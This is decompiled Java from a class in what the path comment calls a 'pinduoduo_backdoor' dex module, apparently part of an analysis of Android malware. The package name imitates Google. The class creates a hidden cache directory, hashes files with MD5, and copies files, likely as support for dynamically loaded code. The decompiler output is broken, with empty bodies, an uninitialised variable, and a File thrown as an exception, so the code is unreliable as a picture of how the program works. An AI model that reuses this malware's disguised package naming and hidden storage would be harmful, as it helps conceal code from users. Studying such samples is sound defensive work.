package com.google.android.sd.biz_dynamic_dex.base;

import android.content.Context;
import android.text.TextUtils;
import java.io.Closeable;
import java.io.File;
import java.io.FileInputStream;
import java.security.MessageDigest;
import java.util.Comparator;
import java.util.Locale;

public final class a {
  private static final Comparator<File> a = new Comparator<File>() {
    
    };
  
  public static File a(Context paramContext) {
    File file = new File(paramContext.getFilesDir(), ".client_slog_cache");
    if (!file.exists() || !file.isDirectory())
      file.mkdirs(); 
    file = new File(file, "temp");
    if (!file.exists() || !file.isDirectory())
      file.mkdirs(); 
    return file;
  }
  
  public static String a(File paramFile) {
    if (!paramFile.exists())
      return ""; 
    try {
      String str = a(new FileInputStream(paramFile));
      boolean bool = TextUtils.isEmpty(str);
      return !bool ? str : "";
    } catch (Exception exception) {
      return "";
    } 
  }
  
  private static String a(FileInputStream paramFileInputStream) {
    try {
      MessageDigest messageDigest = MessageDigest.getInstance("MD5");
      byte[] arrayOfByte = new byte[1024];
      while (true) {
        String str1;
        int i = paramFileInputStream.read(arrayOfByte);
        if (i > 0) {
          messageDigest.update(arrayOfByte, 0, i);
          continue;
        } 
        byte[] arrayOfByte1 = messageDigest.digest();
        if (arrayOfByte1 == null || arrayOfByte1.length == 0) {
          arrayOfByte1 = null;
        } else {
          StringBuilder stringBuilder = new StringBuilder();
          int j = arrayOfByte1.length;
          for (i = 0; i < j; i++) {
            String str = Integer.toHexString(arrayOfByte1[i] & 0xFF);
            if (str.length() < 2)
              stringBuilder.append(0); 
            stringBuilder.append(str);
          } 
          str1 = stringBuilder.toString();
        } 
        String str2 = str1;
        if (str1 != null)
          str2 = str1.toLowerCase(Locale.ROOT); 
        return str2;
      } 
    } catch (Exception exception) {
      return "";
    } finally {
      a(paramFileInputStream);
    } 
  }
  
  private static void a(Closeable paramCloseable) {
    if (paramCloseable != null)
      try {
        paramCloseable.close();
        return;
      } catch (Exception exception) {
        return;
      }  
  }
  
  public static boolean a(File paramFile1, File paramFile2) {
    try {
      return b(paramFile1, paramFile2);
    } finally {
      paramFile1 = null;
    } 
  }
  
  private static boolean b(File paramFile) {
    if (paramFile == null)
      return false; 
    try {
      paramFile = paramFile.getParentFile();
      return (paramFile == null) ? false : ((paramFile.exists() && paramFile.isDirectory()) ? true : paramFile.mkdirs());
    } catch (Exception exception) {
      return false;
    } 
  }
  
  private static boolean b(File paramFile1, File paramFile2) {
    Closeable closeable1;
    b(paramFile2);
    Closeable closeable2 = null;
    try {
    
    } finally {
      paramFile1 = null;
      paramFile2 = null;
    } 
    a(closeable1);
    a((Closeable)paramFile2);
    throw paramFile1;
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\7877ec6850344e7aad5fdd57f6abf238-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */